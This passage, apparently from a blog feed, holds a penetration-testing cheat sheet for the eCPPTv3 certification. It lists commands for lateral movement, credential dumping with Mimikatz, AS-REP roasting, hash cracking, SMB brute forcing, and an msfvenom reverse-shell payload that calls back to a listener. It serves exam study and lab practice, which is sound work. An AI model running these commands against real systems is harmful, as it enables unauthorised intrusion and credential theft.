+&lt;td&gt;Access to target machine&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Lateral Movement:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;xfreerdp /v:192.168.1.100 /u:Administrator /p:&amp;lsquo;Password123&amp;rsquo;&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;smbclient&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Access to SMB/CIFS resource&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Lateral Movement:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;smbclient.py &lt;domain&gt;/&lt;user&gt;:&lt;Password123&gt;@&lt;IP&gt;&lt;/em&gt;&lt;br&gt;&lt;em&gt;smbclient -L //&amp;lt;dc_ip/&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;Enter-PSSession&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Start interactive session&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;Enter-PSSession &lt;domain&gt;&lt;/em&gt;&lt;br&gt;&lt;em&gt;Enter-PSSession seclogs.resesarch.security.local&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;net&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Useful for policy settings&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;net accounts&lt;/em&gt;&lt;br&gt;&lt;em&gt;net user administrator&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;runas&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Access to victim&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;runas.exe /user:administrator cmd&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;PowerView&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Enumeration AD - Powersploit suite&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;AS-REP Roasting primary step:&lt;/strong&gt;&lt;br&gt;_Get-DomainUser&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;winpeas&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Identify misconfigurations, permissions, and vulnerabilities&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Privilege escalation:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;winpeas.exe&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;msfvenom&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Used to generate a reverse_tcp payload&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe &amp;gt; rTCP.exe&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;msfconsole&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Metasploit module&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;msfconsole -q&lt;/em&gt;&lt;br&gt;&lt;strong&gt;Meterpreter session:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;exploit/windows/misc/hta_server&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;Mimikatz&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;a class="link" href="https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/" target="_blank" rel="noopener"
+&gt;https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;hashdump:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;hashdump&lt;/em&gt;&lt;br&gt;Return NTLM Hash of the user&lt;br&gt;&lt;strong&gt;creds_all:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;creds:all&lt;/em&gt;&lt;br&gt;Extract all possible hashes or credentials&lt;br&gt;&lt;strong&gt;lsa_dump_secrets:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;lsa_dump_secrets&lt;/em&gt;&lt;br&gt;Extract credential stored into Local Security Authority&lt;br&gt;&lt;strong&gt;lsa_dump_sam:&lt;/strong&gt;&lt;br&gt;&lt;em&gt;lsa_dump_sam&lt;/em&gt;&lt;br&gt;Extract Security Account Manager and dumps credentials for local accounts&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;psexec&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Execute command on target machine&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;psexec \\&amp;lt;target_ip&amp;gt; &amp;lt;cmd_command&amp;gt;&lt;/em&gt;&lt;br&gt;OR&lt;br&gt;Use for PTH&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;wmiexec&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Used to run command on target machine&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;python wmiexec.py username:password@target_ip &amp;ldquo;whoami&amp;rdquo;&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;fping&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Ping ICMP machines to get alive&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;fping -a -g 192.168.1.0/24&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;GetNPUsers&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Used to find hash&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;python GetNPUsers.py &lt;domain&gt;/ -userfile &amp;lt;username.txt&amp;gt; -format hashcat -outputfile &amp;lt;hash_out.txt&amp;gt;&lt;/em&gt;&lt;br&gt;&lt;em&gt;rebeus.exe asreproast /format:hashcat&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;hashcat&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Used to crack hash&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;hashcat -m &lt;algorithm&gt; -a &amp;lt;type_of_attack&amp;gt; hash.txt&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;hydra&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Brute force&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.0.89 smb2&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;wpscan&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Wordpress vuln&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;nmap&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Port scanning&lt;/td&gt;
+&lt;td&gt;&lt;em&gt;nmap -sC -sV -Pn -p- -oA output.txt &amp;lt;IP_addr&amp;gt; -vv&lt;/em&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;img src="https://robertodandrea.com/post/ine/certified-professional-penetration-tester-ecpptv3-ine/eCPPT_DANDREA.png"
+width="1196"
+height="920"
+srcset="https://robertodandrea.com/post/ine/certified-professional-penetration-tester-ecpptv3-ine/eCPPT_DANDREA_hu_60da1446b3c0eb65.png 480w, https://robertodandrea.com/post/ine/certified-professional-penetration-tester-ecpptv3-ine/eCPPT_DANDREA_hu_7e2792e6e909694f.png 1024w"
+loading="lazy"
+alt="eCPPTv3 certification"
+class="gallery-image"
+data-flex-grow="130"
+data-flex-basis="312px"
+&gt;&lt;/p&gt;
+&lt;h3 id="conclusion"&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;The &lt;strong&gt;eCPPTv3 certification&lt;/strong&gt; offers cybersecurity professionals a valuable opportunity to deepen their expertise in penetration testing, particularly focusing on Active Directory environments. By engaging with hands-on labs and utilizing resources like &lt;strong&gt;GOAD&lt;/strong&gt; and &lt;strong&gt;Hack The Box&lt;/strong&gt;, candidates can develop practical skills essential for real-world security assessments. The exam&amp;rsquo;s emphasis on Active Directory exploitation reflects current security needs, highlighting the importance of mastering techniques to identify and mitigate risks associated with identity and access management within organizations.&lt;/p&gt;
+&lt;p&gt;Incorporating these resources into your preparation can enhance your understanding and proficiency in penetration testing, thereby increasing your chances of success in the eCPPTv3 exam.&lt;/p&gt;</description></item></channel></rss>
